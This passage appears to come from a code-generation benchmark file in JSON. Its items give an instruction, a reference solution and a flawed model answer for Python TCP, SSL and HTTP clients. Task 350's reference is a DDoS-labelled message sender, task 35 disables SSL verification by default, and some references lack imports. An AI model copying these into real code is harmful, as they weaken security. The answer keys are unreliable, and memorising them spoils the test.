    "wrong_result": "```python\nimport socket\n\ndef tcp_client_communication(host=\"localhost\", port=5001, message=b\"GPS Tracker Message\"):\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n        s.connect((host, port))\n        s.sendall(message)\n        try:\n            while True:\n                data = s.recv(1024)\n                if not data:\n                    break\n                print(data.decode())\n        except KeyboardInterrupt:\n            print(\"\\nClient interrupted by user.\")\n```"
  },
  {
    "Task_id": 344,
    "Instruction": "Task Description: Create a Python function that establishes a TCP connection to a specified server, sends a payload consisting of a command and optional padding, and then closes the connection.\n\nFunction Description: The function `send_tcp_payload` creates a TCP socket, connects to a target server using the provided IP address and port, sends a payload formed by combining a command string with optional padding, and finally closes the socket connection. This is useful for simple TCP-based client-server communication scenarios.\n\nInput:\n- `ipaddr`: [str] - The IP address of the target server to connect to\n- `port`: [int] - The port number on the target server to connect to\n- `cmd`: [str] - The command string to be sent as part of the payload\n- `padding`: [str] - Optional additional data to be appended to the command\n\nOutput: None (The function performs an action but doesn't return any value)",
    "Canonical_solution": "import socket\n\ndef send_tcp_payload(ipaddr, port, cmd, padding):\n    payload = cmd + padding\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((ipaddr, port))\n    s.send(payload.encode())\n    s.close()",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "wrong_result": "```python\nimport socket\n\ndef send_tcp_payload(ipaddr, port, cmd, padding=\"\"):\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n        s.connect((ipaddr, port))\n        payload = cmd + padding\n        s.sendall(payload.encode())\n```"
  },
  {
    "Task_id": 345,
    "Instruction": "Task Description: Create a Python class that interacts with an APC UPS daemon (apcupsd) via TCP socket to collect and process UPS metrics.\n\nClass Description: The ApcupsdCollector class establishes a TCP connection to an apcupsd server, retrieves status information, and processes the raw data into structured metrics. It handles socket communication, data parsing, and metric filtering.\n\nAttributes:\n- config: [dict] - Configuration dictionary containing hostname (str), port (int), and metrics (list of str) to collect\n\nMethods:\n- __init__(hostname='localhost', port=3551, metrics=None) -> None - Initializes the collector with connection parameters and metrics to collect\n- getData() -> str - Establishes TCP connection, sends status request, and returns raw UPS data\n- collect() -> dict - Processes raw data into structured metrics, returning a dictionary of metric_name: value pairs",
    "Canonical_solution": "import socket\nfrom struct import pack\nimport re\nimport time\n\nclass ApcupsdCollector:\n    def __init__(self, hostname='localhost', port=3551, metrics=None):\n        self.config = {\n            'hostname': hostname,\n            'port': port,\n            'metrics': metrics or ['LINEV', 'LOADPCT', 'BCHARGE', 'TIMELEFT', 'BATTV',\n                                 'NUMXFERS', 'TONBATT', 'MAXLINEV', 'MINLINEV',\n                                 'OUTPUTV', 'ITEMP', 'LINEFREQ', 'CUMONBATT']\n        }\n\n    def getData(self):\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.connect((self.config['hostname'], int(self.config['port'])))\n        s.send(pack('xb6s', 6, 'status'))\n        s.recv(1024)\n        time.sleep(.25)\n        data = s.recv(4096)\n        s.close()\n        return data\n\n    def collect(self):\n        metrics = {}\n        raw = {}\n        data = self.getData()\n        data = data.split('\\n\\x00')\n        \n        for d in data:\n            matches = re.search(\"([A-Z]+)\\s+:\\s+(.*)$\", d)\n            if matches:\n                value = matches.group(2).strip()\n                raw[matches.group(1)] = value\n                vmatch = re.search(\"([0-9.]+)\", value)\n                if not vmatch:\n                    continue\n                try:\n                    value = float(vmatch.group(1))\n                except ValueError:\n                    continue\n                metrics[matches.group(1)] = value\n\n        results = {}\n        for metric in self.config['metrics']:\n            if metric not in metrics:\n                continue\n            metric_name = \"%s.%s\" % (raw['UPSNAME'], metric)\n            value = metrics[metric]\n            results[metric_name] = value\n\n        return results",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
    "wrong_result": "```python\nimport socket\n\nclass ApcupsdCollector:\n    def __init__(self, hostname='localhost', port=3551, metrics=None):\n        self.config = {\n            'hostname': hostname,\n            'port': port,\n            'metrics': metrics if metrics else []\n        }\n\n    def getData(self):\n        try:\n            with socket.create_connection((self.config['hostname'], self.config['port']), timeout=5) as sock:\n                sock.sendall(b'GET /status HTTP/1.0\\r\\nUser-Agent: apcupsd-collector\\r\\n\\r\\n')\n                data = b''\n                while True:\n                    chunk = sock.recv(4096)\n                    if not chunk:\n                        break\n                    data += chunk\n                return data.decode('utf-8', errors='ignore')\n        except Exception as e:\n            raise ConnectionError(f\"Failed to connect to apcupsd: {e}\")\n\n    def collect(self):\n        raw_data = self.getData()\n        lines = [line.strip() for line in raw_data.split('\\r\\n') if line.strip()]\n        metrics = {}\n        for line in lines:\n            if ':' in line:\n                key, value = line.split(':', 1)\n                key = key.strip().lower().replace(' ', '_')\n                value = value.strip()\n                if key in self.config['metrics'] or not self.config['metrics']:\n                    metrics[key] = value\n        return metrics\n```"
  },
  {
    "Task_id": 348,
    "Instruction": "Task Description: Implement a secure TCP client using SSL/TLS for encrypted communication with a server. The client should establish a secure connection, send data, receive responses, and properly close the connection.\n\nFunction Description: The code consists of two functions:\n1. `ssl_client_connect` - Creates and returns an SSL-wrapped socket connected to the specified host and port, with certificate verification\n2. `ssl_client_communicate` - Sends a message through the secure socket, receives the response, and closes the connection\n\nInput:\n- For `ssl_client_connect`:\n  - host: str - The target server's hostname or IP address\n  - port: int - The target server's port number\n  - cert_file: str - Path to the CA certificate file for server verification\n\n- For `ssl_client_communicate`:\n  - ssl_socket: ssl.SSLSocket - The established SSL socket connection\n  - message: bytes - The data to send to the server\n\nOutput:\n- For `ssl_client_connect`: Returns an established SSL socket connection (ssl.SSLSocket)\n- For `ssl_client_communicate`: Returns the server's response as bytes",
    "Canonical_solution": "from socket import socket, AF_INET, SOCK_STREAM\nimport ssl\n\ndef ssl_client_connect(host, port, cert_file):\n    s = socket(AF_INET, SOCK_STREAM)\n    ssl_s = ssl.wrap_socket(s,\n                           cert_reqs=ssl.CERT_REQUIRED,\n                           ca_certs=cert_file)\n    ssl_s.connect((host, port))\n    return ssl_s\n\ndef ssl_client_communicate(ssl_socket, message):\n    ssl_socket.send(message)\n    resp = ssl_socket.recv(8192)\n    ssl_socket.close()\n    return resp",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "wrong_result": "```python\nimport ssl\nimport socket\n\ndef ssl_client_connect(host, port, cert_file):\n    context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)\n    context.verify_mode = ssl.CERT_REQUIRED\n    context.load_verify_locations(cafile=cert_file)\n\n    sock = socket.create_connection((host, port))\n    ssl_socket = context.wrap_socket(sock, server_hostname=host)\n    return ssl_socket\n\ndef ssl_client_communicate(ssl_socket, message):\n    try:\n        ssl_socket.sendall(message)\n        response = b''\n        while True:\n            data = ssl_socket.recv(4096)\n            if not data:\n                break\n            response += data\n        return response\n    finally:\n        ssl_socket.close()\n```"
  },
  {
    "Task_id": 349,
    "Instruction": "Task Description: Create a Python class that provides TCP socket functionality including connection establishment, data transmission, and SSL support for secure communication.\n\nClass Description: The SocketLibrary class encapsulates TCP socket operations with support for both regular and SSL-wrapped connections. It provides methods to establish connections, send/receive data, and gather connection information.\n\nAttributes: None (This is a utility class without persistent attributes)\n\nMethods:\n\nMethod1: create_tcp_socket(host: str, port: int, timeout: float) -> Optional[Tuple[socket.socket, bool]] - Creates and returns a TCP socket connection to the specified host and port. Attempts SSL connection first, falls back to regular TCP if SSL fails. Returns a tuple containing the socket object and SSL flag (True if SSL succeeded).\n\nMethod2: tcp_connect_only(host: str, port: int, timeout: float) -> Optional[Dict[str, Any]] - Establishes a TCP connection to verify connectivity and returns connection details including peer information, service name, and SSL status without data transmission.\n\nMethod3: tcp_connect_send_and_receive(host: str, port: int, timeout: float) -> Optional[Dict[str, Any]] - Establishes a TCP connection, sends test data, receives response, and returns connection details including peer information, service name, response data, and SSL status.",
    "Canonical_solution": "import socket\nimport ssl\nfrom typing import Optional, Tuple, Dict, Any\n\nclass SocketLibrary:\n    def create_tcp_socket(self, host: str, port: int, timeout: float) -> Optional[Tuple[socket.socket, bool]]:\n        try:\n            socket_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            socket_connection.settimeout(timeout)\n            socket_connection.connect((host, port))\n            ssl_flag = False\n        except ConnectionRefusedError:\n            return None\n\n        try:\n            socket_connection = ssl.wrap_socket(socket_connection)\n            ssl_flag = True\n        except Exception:\n            socket_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            socket_connection.settimeout(timeout)\n            socket_connection.connect((host, port))\n\n        return socket_connection, ssl_flag\n\n    def tcp_connect_only(self, host: str, port: int, timeout: float) -> Optional[Dict[str, Any]]:\n        tcp_socket = self.create_tcp_socket(host, port, timeout)\n        if tcp_socket is None:\n            return None\n\n        socket_connection, ssl_flag = tcp_socket\n        peer_name = socket_connection.getpeername()\n        socket_connection.close()\n        return {\n            \"peer_name\": peer_name,\n            \"service\": socket.getservbyport(int(port)),\n            \"ssl_flag\": ssl_flag,\n        }\n\n    def tcp_connect_send_and_receive(self, host: str, port: int, timeout: float) -> Optional[Dict[str, Any]]:\n        tcp_socket = self.create_tcp_socket(host, port, timeout)\n        if tcp_socket is None:\n            return None\n\n        socket_connection, ssl_flag = tcp_socket\n        peer_name = socket_connection.getpeername()\n        try:\n            socket_connection.send(b\"ABC\\x00\\r\\n\\r\\n\\r\\n\" * 10)\n            response = socket_connection.recv(1024 * 1024 * 10)\n            socket_connection.close()\n        except Exception:\n            try:\n                socket_connection.close()\n                response = b\"\"\n            except Exception:\n                response = b\"\"\n        return {\n            \"peer_name\": peer_name,\n            \"service\": socket.getservbyport(port),\n            \"response\": response.decode(errors=\"ignore\"),\n            \"ssl_flag\": ssl_flag,\n        }",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
    "wrong_result": "```python\nimport socket\nimport ssl\nfrom typing import Optional, Tuple, Dict, Any\n\nclass SocketLibrary:\n    @staticmethod\n    def create_tcp_socket(host: str, port: int, timeout: float) -> Optional[Tuple[socket.socket, bool]]:\n        try:\n            context = ssl.create_default_context()\n            sock = socket.create_connection((host, port), timeout=timeout)\n            ssl_sock = context.wrap_socket(sock, server_hostname=host)\n            return (ssl_sock, True)\n        except Exception as e:\n            try:\n                sock = socket.create_connection((host, port), timeout=timeout)\n                return (sock, False)\n            except Exception as e2:\n                return None\n\n    @staticmethod\n    def tcp_connect_only(host: str, port: int, timeout: float) -> Optional[Dict[str, Any]]:\n        result = {'connected': False, 'peer': '', 'service': '', 'ssl': False}\n        try:\n            sock = socket.create_connection((host, port), timeout=timeout)\n            peer = sock.getpeername()\n            service = socket.getservbyport(port)\n            result['connected'] = True\n            result['peer'] = f\"{peer[0]}:{peer[1]}\"\n            result['service'] = service\n            result['ssl'] = False\n            sock.close()\n            return result\n        except Exception as e:\n            try:\n                context = ssl.create_default_context()\n                sock = socket.create_connection((host, port), timeout=timeout)\n                ssl_sock = context.wrap_socket(sock, server_hostname=host)\n                peer = ssl_sock.getpeername()\n                service = socket.getservbyport(port)\n                result['connected'] = True\n                result['peer'] = f\"{peer[0]}:{peer[1]}\"\n                result['service'] = service\n                result['ssl'] = True\n                ssl_sock.close()\n                return result\n            except Exception as e2:\n                return None\n\n    @staticmethod\n    def tcp_connect_send_and_receive(host: str, port: int, timeout: float) -> Optional[Dict[str, Any]]:\n        result = {'connected': False, 'peer': '', 'service': '', 'response': '', 'ssl': False}\n        connection = SocketLibrary.create_tcp_socket(host, port, timeout)\n        if not connection:\n            return None\n        sock, is_ssl = connection\n        try:\n            test_data = b\"GET / HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n\"\n            sock.sendall(test_data)\n            response = sock.recv(4096)\n            peer = sock.getpeername()\n            service = socket.getservbyport(port)\n            result['connected'] = True\n            result['peer'] = f\"{peer[0]}:{peer[1]}\"\n            result['service'] = service\n            result['response'] = response.decode(errors='ignore')\n            result['ssl'] = is_ssl\n            sock.close()\n            return result\n        except Exception as e:\n            sock.close()\n            return None\n```"
  },
  {
    "Task_id": 35,
    "Instruction": "Task Description: Create a Python class that provides HTTP client functionality using both the `httpx` and `requests` libraries, with support for common HTTP methods, SSL verification control, and custom headers.\n\nClass Description: The `HTTPClient` class encapsulates HTTP request functionality, offering methods to perform GET requests and check API/web accessibility. It supports custom headers and SSL verification configuration.\n\nAttributes:\n\nheader: dict - Dictionary containing HTTP headers to be sent with requests (default includes User-Agent)\nverify: bool - Flag indicating whether to verify SSL certificates (default is False)\n\nMethods:\n\ntest_api_web: test_api_web(url: str) -> Optional[Tuple[str, str]] - Checks if a web API/URL is accessible and returns a tuple containing the page title and URL if successful, None otherwise\nget_request: get_request(url: str, params: dict = None) -> requests.Response - Sends a GET request using the requests library and returns the Response object\nclient_get: client_get(url: str) -> httpx.Response - Sends a GET request using httpx client and returns the Response object",
    "Canonical_solution": "import httpx\nimport requests\nfrom typing import Optional, Tuple\nfrom loguru import logger\n\nclass HTTPClient:\n    def __init__(self, headers: dict = None, verify_ssl: bool = False):\n        self.header = headers or {\n            \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36\"\n        }\n        self.verify = verify_ssl\n\n    def test_api_web(self, url: str) -> Optional[Tuple[str, str]]:\n        \"\"\"Check if API web is accessible\n        :return: Tuple containing (title, url) if successful, None otherwise\n        \"\"\"\n        if url is None:\n            return None\n            \n        with httpx.Client(headers=self.header, verify=self.verify) as client:\n            try:\n                resp = client.get(url=url).text\n                title = re.findall('<title>(.*?)</title>', resp)\n                if title:\n                    logger.info(f\"{url} title:{title[0]}\")\n                    return (title[0], url)\n            except httpx.HTTPError as why:\n                logger.error(f\"{url} request error! {why}\")\n        return None\n\n    def get_request(self, url: str, params: dict = None) -> requests.Response:\n        \"\"\"Send GET request using requests library\n        :return: Response object\n        \"\"\"\n        try:\n            return requests.get(\n                url,\n                headers=self.header,\n                params=params,\n                timeout=8,\n                verify=self.verify\n            )\n        except Exception as e:\n            logger.error(f\"GET request failed: {e}\")\n            raise\n\n    def client_get(self, url: str) -> httpx.Response:\n        \"\"\"Send GET request using httpx client\n        :return: Response object\n        \"\"\"\n        with httpx.Client(verify=self.verify) as client:\n            return client.get(url, headers=self.header)",
    "Code_level": "Class-level",
    "FSMID_for_test": 58,
    "wrong_result": "```python\nimport requests\nimport httpx\nfrom typing import Optional, Tuple\n\nclass HTTPClient:\n    def __init__(self, header: dict = None, verify: bool = False):\n        self.header = header if header else {\n            \"User-Agent\": \"Mozilla/5.0 (compatible; HTTPClient/1.0)\"\n        }\n        self.verify = verify\n\n    def test_api_web(self, url: str) -> Optional[Tuple[str, str]]:\n        try:\n            response = requests.get(url, headers=self.header, verify=self.verify)\n            response.raise_for_status()\n            title_match = re.search(r\"<title>(.*?)</title>\", response.text, re.IGNORECASE)\n            page_title = title_match.group(1) if title_match else \"No Title\"\n            return (page_title, url)\n        except Exception:\n            return None\n\n    def get_request(self, url: str, params: dict = None) -> requests.Response:\n        return requests.get(url, headers=self.header, params=params, verify=self.verify)\n\n    def client_get(self, url: str) -> httpx.Response:\n        with httpx.Client(headers=self.header, verify=self.verify) as client:\n            return client.get(url)\n```"
  },
  {
    "Task_id": 350,
    "Instruction": "Task Description: Create a Python function that establishes a TCP connection to a specified host and port, sends a message multiple times, and handles potential connection errors.\n\nFunction Description: The function establishes a TCP connection to a target server using IPv4, sends a specified message multiple times (including one sendto operation), and properly closes the connection. It includes error handling for connection failures and provides status messages about the operation.\n\nInput:\n- host: str - The target server's IP address or hostname\n- port: int - The target port number to connect to\n- message: bytes - The message to be sent to the server (should be in bytes format)\n\nOutput:\n- None (prints status messages to console)\n- Returns None implicitly\n- Side effect: Sends network packets to the specified host and port",
    "Canonical_solution": "import socket\n\ndef dos(host, port, message):\n    ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    try:\n        ddos.connect((host, port))\n        ddos.send(message)\n        ddos.sendto(message, (host, port))\n        ddos.send(message)\n    except socket.error as msg:\n        print(\"|[Connection Failed]         |\")\n    print(\"|[DDoS Attack Engaged]       |\")\n    ddos.close()",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "wrong_result": "```python\nimport socket\n\ndef send_tcp_messages(host, port, message):\n    try:\n        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:\n            sock.connect((host, port))\n            print(\"Connected to the server.\")\n            for i in range(3):\n                sock.sendall(message)\n                print(f\"Message sent {i + 1} times.\")\n            # Using sendto (not typical for TCP but possible)\n            bytes_sent = sock.sendto(message, (host, port))\n            if bytes_sent == len(message):\n                print(\"Message sent using sendto().\")\n            else:\n                print(\"Failed to send full message using sendto().\")\n    except socket.error as e:\n        print(f\"Connection failed: {e}\")\n```"
  },
  {
    "Task_id": 352,
    "Instruction": "Task Description: Write a Python function that tests command responses from a Kamstrup management server by sending specific commands and verifying the responses against expected values.\n\nFunction Description: The function establishes a TCP connection to a Kamstrup management server, sends a help command and a specific packet command, then verifies if the responses match the expected values from a predefined response dictionary. The function returns True only if both responses match their expected values.\n\nInput:\n- packet_type: [str] - The key used to look up the expected response in the RESPONSES dictionary for the packet command.\n- help_msg_command: [bytes] - The byte string representing the help command to be sent to the server.\n- packet_msg_command: [bytes] - The byte string representing the packet command to be sent to the server.\n- kamstrup_management_server: [object] - An object containing the server's connection details, specifically the server port.\n\nOutput:\n- [bool] - Returns True if both the help command response and packet command response match their expected values in the RESPONSES dictionary, otherwise returns False.",
    "Canonical_solution": "from gevent import socket\nfrom conpot.tests.data.kamstrup_management_data import RESPONSES\n\ndef check_command_resp_help_message(\n    packet_type, help_msg_command, packet_msg_command, kamstrup_management_server\n):\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((\"127.0.0.1\", kamstrup_management_server.server.server_port))\n    _ = s.recv(1024)  # receive the banner\n    s.sendall(help_msg_command)  # test the help command\n    help_data = s.recv(1024)\n    help_response = help_data == RESPONSES[\"H\"][packet_type]\n    s.sendall(packet_msg_command)\n    pkt_data = s.recv(1024)\n    packet_resp = pkt_data == RESPONSES[packet_type]\n    s.close()\n    return help_response and packet_resp",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "wrong_result": "```python\nimport socket\n\nRESPONSES = {\n    'HELPER': b'Help message response',\n    'PACKET': b'Packet data response'\n}\n\ndef test_kamstrup_commands(packet_type, help_msg_command, packet_msg_command, kamstrup_management_server):\n    host = '127.0.0.1'\n    port = getattr(kamstrup_management_server, 'server_port', 502)\n    \n    expected_help_response = RESPONSES.get('HELPER')\n    expected_packet_response = RESPONSES.get(packet_type)\n\n    with socket.create_connection((host, port), timeout=10) as s:\n        # Send and receive help command\n        s.sendall(help_msg_command)\n        help_response = s.recv(4096)\n\n        # Send and receive packet command\n        s.sendall(packet_msg_command)\n        packet_response = s.recv(4096)\n\n        return help_response == expected_help_response and packet_response == expected_packet_response\n```"
  },
  {
    "Task_id": 353,
    "Instruction": "Task Description: Implement a TCP client function in Python that communicates with a server using sockets. The function should establish a connection, send a message, receive a response, and close the connection.\n\nFunction Description: The function `tcp_client_communication` creates a TCP socket, connects to a specified server, sends a message, receives a response, and then closes the connection. It uses IPv4 for the socket connection.\n\nInput:\n- `host` (str, optional): The IP address or hostname of the server. Defaults to 'localhost'.\n- `port` (int, optional): The port number on which the server is listening. Defaults to 16000.\n- `message` (bytes, optional): The message to be sent to the server. Defaults to b'Hello\\n'.\n\nOutput:\n- `response` (bytes): The data received from the server as a response.",
    "Canonical_solution": "from socket import socket, AF_INET, SOCK_STREAM\n\ndef tcp_client_communication(host='localhost', port=16000, message=b'Hello\\n'):\n    s = socket(AF_INET, SOCK_STREAM)\n    s.connect((host, port))\n    s.send(message)\n    response = s.recv(8192)\n    s.close()\n    return response",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "wrong_result": "```python\nimport socket\n\ndef tcp_client_communication(host='localhost', port=16000, message=b'Hello\\n'):\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n        s.connect((host, port))\n        s.sendall(message)\n        response = s.recv(4096)\n    return response\n```"
  },
  {
    "Task_id": 355,
    "Instruction": "Task Description: Implement a TCP client for Remote Console (RCon) protocol communication, which allows sending commands to a game server and receiving responses. The implementation should handle connection establishment, command sending, response receiving, and error handling.\n\nClass Description: RConConnection is a class that manages the connection to an RCon server, handles authentication, and provides methods to send commands and receive responses. It includes error handling for various RCon protocol scenarios.\n\nAttributes:\n- sock: [socket.socket] - The TCP socket object used for communication with the RCon server\n- rid: [int] - The current request ID used for tracking requests and responses\n\nMethods:\n- __init__(target: str, port: int) -> None - Initializes the RCon connection by creating a TCP socket and connecting to the specified target and port\n- send(t: int, payload: str) -> bytes - Sends an RCon packet with the specified type and payload, waits for and returns the response data\n- login(password: str) -> None - Authenticates with the RCon server using the provided password (uses send with type 3)\n- command(com: str, args: str) -> None - Sends a command to the RCon server (uses send with type 2)\n- close() -> None - Closes the connection to the RCon server",
    "Canonical_solution": "import socket\nimport struct\nimport select\n\nclass RConException(Exception):\n    def __init__(self, request_id, reason):\n        self.request_id = request_id\n        self.reason = reason\n\n    def __str__(self):\n        return (\"Failed RCon request with request ID %d, reason %s\" %\n                (self.request_id, self.reason))\n\nclass RConConnection:\n    def __init__(self, target, port):\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.sock.connect((target, port))\n        self.rid = 0\n\n    def send(self, t, payload):\n        self.rid = self.rid + 1\n        pld_enc = payload.encode(\"utf-8\")\n        header = struct.pack(\"<iii\",\n                             len(pld_enc) + 4 + 4 + 2,  # rid, type and padding\n                             self.rid, t)\n        data = header + pld_enc + b'\\x00\\x00'\n        self.sock.send(data)\n\n        toread = select.select([self.sock], [], [], 30)\n\n        if not toread:\n            raise RConException(self.rid, \"Request timed out.\")\n\n        try:\n            res_len, res_id, res_type = \\\n                struct.unpack(\"<iii\", self.sock.recv(12, socket.MSG_WAITALL))\n            if res_len < 0:\n                raise Exception(\"Response length is {}.\".format(res_len))\n\n        except Exception as e:\n            raise RConException(self.rid,\n                                \"RCon protocol error. Are you sure you're \"\n                                \"talking to the RCon port? Error: %s\" % e)\n        res_data = self.sock.recv(res_len - 4 - 4)\n        res_data = res_data[:-2]\n\n        if res_id == -1:\n            if t == 3:\n                raise RConException(self.rid, \"Login failed.\")\n            else:\n                raise RConException(self.rid,\n                                    \"Request failed due to invalid login.\")\n        elif res_id != self.rid:\n            raise RConException(self.rid, \"Received unexpected response \"\n                                \"number: %d\" % res_id)\n        return res_data\n\n    def login(self, password):\n        self.send(3, password)\n\n    def command(self, com, args):\n        self.send(2, com + \" \" + args)\n\n    def close(self):\n        self.sock.close()",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
    "wrong_result": "```python\nimport socket\n\nclass RConConnection:\n    def __init__(self, target: str, port: int) -> None:\n        self.sock = socket.create_connection((target, port))\n        self.rid = 0\n\n    def send(self, t: int, payload: str) -> bytes:\n        self.rid += 1\n        packet = (\n            b'\\x00' * 10 +\n            (str(self.rid)).encode('ascii') + b'\\x00\\x00' +\n            (str(t)).encode('ascii') + b'\\x00\\x00' +\n            payload.encode('ascii') + b'\\x00\\x00'\n        )\n        length = len(packet)\n        header = (length).to_bytes(4, 'little') + (length).to_bytes(4, 'little')\n        packet = header + packet\n\n        self.sock.sendall(packet)\n\n        response_length = 0\n        while True:\n            data = self.sock.recv(4096)\n            if not data:\n                break\n            response_length += len(data)\n            if response_length >= 4:\n                break\n        return data\n\n    def login(self, password: str) -> None:\n        self.send(3, password)\n\n    def command(self, com: str, args: str) -> None:\n        full_command = f\"{com} {args}\"\n        self.send(2, full_command)\n\n    def close(self) -> None:\n        self.sock.close()\n```"
  },
  {
    "Task_id": 356,
    "Instruction": "Task Description: Implement a TCP client class that communicates with a server to validate sessions using JSON-RPC protocol, handling connection management, data transmission, and response validation.\n\nClass Description: CaseTCP is a TCP client class that establishes and maintains a connection to a server, sends session validation requests in JSON-RPC format, and processes the server's responses with proper error handling and assertion checks.\n\nAttributes:\n- identity: int - A unique identifier for the client (defaults to process ID)\n- expected: bool - The expected validation result from the server\n- uri: str - The server IP address (default: '127.0.0.1')\n- port: int - The server port number (default: 8545)\n- sock: socket.socket - The TCP socket object for communication\n- payload: str - A random string payload for session validation\n\nMethods:\n- __init__(uri: str = '127.0.0.1', port: int = 8545, identity: int = os.getpid()) -> None - Initializes the client with server connection details and generates a random payload\n- __call__(**kwargs) -> int - Makes a combined send and receive call (takes optional a and b parameters)\n- send(*, a: Optional[int] = None, b: Optional[int] = None) -> int - Sends a session validation request to the server with optional parameters (generates random values if not provided)\n- recv() -> int - Receives and validates the server response, returning the validation result",
    "Canonical_solution": "import os\nimport json\nimport errno\nimport socket\nfrom typing import Optional\n\ndef make_tcp_socket(ip: str, port: int):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect((ip, port))\n    return sock\n\ndef socket_is_closed(sock: socket.socket) -> bool:\n    if sock is None:\n        return True\n    try:\n        buf = sock.recv(1, socket.MSG_PEEK | socket.MSG_DONTWAIT)\n        if buf == b'':\n            return True\n    except BlockingIOError as exc:\n        if exc.errno != errno.EAGAIN:\n            raise\n    return False\n\ndef recvall(sock, buffer_size=4096):\n    data = b\"\"\n    while True:\n        chunk = sock.recv(buffer_size)\n        if not chunk:\n            break\n        data += chunk\n    return data\n\nclass CaseTCP:\n    def __init__(self, uri: str = '127.0.0.1', port: int = 8545, identity: int = os.getpid()) -> None:\n        self.identity = identity\n        self.expected = -1\n        self.uri = uri\n        self.port = port\n        self.sock = None\n        self.payload = ''.join(random.choices(string.ascii_uppercase, k=80))\n\n    def __call__(self, **kwargs) -> int:\n        self.send(**kwargs)\n        return self.recv()\n\n    def send(self, *, a: Optional[int] = None, b: Optional[int] = None) -> int:\n        a = random.randint(1, 1000) if a is None else a\n        b = random.randint(1, 1000) if b is None else b\n        jsonrpc = '{\"jsonrpc\":\"2.0\",\"id\":%i,\"method\":\"validate_session\",\"params\":{\"user_id\":%i,\"session_id\":%i,\"text\":\"%s\"}}' % (self.identity, a, b, self.payload)\n        self.expected = (a ^ b) % 23 == 0\n        self.sock = make_tcp_socket(self.uri, self.port) if socket_is_closed(self.sock) else self.sock\n        self.sock.send(jsonrpc.encode())\n\n    def recv(self) -> int:\n        response_bytes = recvall(self.sock).decode()\n        self.sock.settimeout(None)\n        response = json.loads(response_bytes)\n        assert 'error' not in response, response['error']\n        received = response['result']\n        assert response['jsonrpc']\n        assert response.get('id', None) == self.identity\n        assert self.expected == received, 'Wrong Answer'\n        return received",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
    "wrong_result": "```python\nimport os\nimport socket\nimport json\nimport random\nimport string\nfrom typing import Optional\n\nclass CaseTCP:\n    def __init__(self, uri: str = '127.0.0.1', port: int = 8545, identity: int = None) -> None:\n        self.identity = identity if identity is not None else os.getpid()\n        self.expected = False\n        self.uri = uri\n        self.port = port\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.payload = ''.join(random.choices(string.ascii_letters + string.digits, k=16))\n        self.sock.connect((self.uri, self.port))\n\n    def __call__(self, **kwargs) -> int:\n        return self.send(**kwargs)\n\n    def send(self, *, a: Optional[int] = None, b: Optional[int] = None) -> int:\n        a_val = a if a is not None else random.randint(1, 100)\n        b_val = b if b is not None else random.randint(1, 100)\n\n        request = {\n            \"jsonrpc\": \"2.0\",\n            \"method\": \"validateSession\",\n            \"params\": [self.identity, self.payload, a_val, b_val],\n            \"id\": 1\n        }\n\n        self.sock.sendall(json.dumps(request).encode('utf-8'))\n        return self.recv()\n\n    def recv(self) -> int:\n        data = ''\n        while True:\n            chunk = self.sock.recv(4096).decode('utf-8')\n            if not chunk:\n                break\n            data += chunk\n            try:\n                response = json.loads(data)\n                break\n            except json.JSONDecodeError:\n                continue\n\n        result = response.get('result', -1)\n        assert isinstance(result, int), f\"Expected integer result, got {type(result)}\"\n        assert result in (0, 1), f\"Unexpected result value: {result}\"\n        self.expected = bool(result)\n        return result\n```"
  },
  {
    "Task_id": 357,
    "Instruction": "Task Description: Create a Python function that tests TCP connectivity to a target server through a SOCKS5 proxy, sends an HTTP request, and measures the response time.\n\nFunction Description: The function establishes a TCP connection to a specified target server through a SOCKS5 proxy, sends a basic HTTP GET request, verifies the response, and measures the time taken for the entire operation. The function handles connection setup, data transmission, response validation, and cleanup.\n\nInput: None (The target server address 'TARGET' is defined as a module-level constant)\n\nOutput: None (The function prints diagnostic messages and timing information to stdout)",
    "Canonical_solution": "import socket\nimport socks\nimport time\n\nTARGET = \"1.1.1.1\"\n\ndef test_tcp() -> None:\n    s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)\n    s.set_proxy(socks.SOCKS5, \"127.0.0.1\", 1080)\n\n    print(f\"TCP - Sending HTTP request to {TARGET}\")\n    start = time.time()\n    s.connect((TARGET, 80))\n    s.send(b\"GET / HTTP/1.1\\r\\nHost: \" + TARGET.encode() + b\"\\r\\n\\r\\n\")\n    data = s.recv(1024)\n    if not data:\n        print(\"No data received\")\n    elif not data.startswith(b\"HTTP/1.1 \"):\n        print(\"Invalid response received\")\n    else:\n        print(\"TCP test passed\")\n    end = time.time()\n    s.close()\n\n    print(f\"Time: {round((end - start) * 1000, 2)} ms\")",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
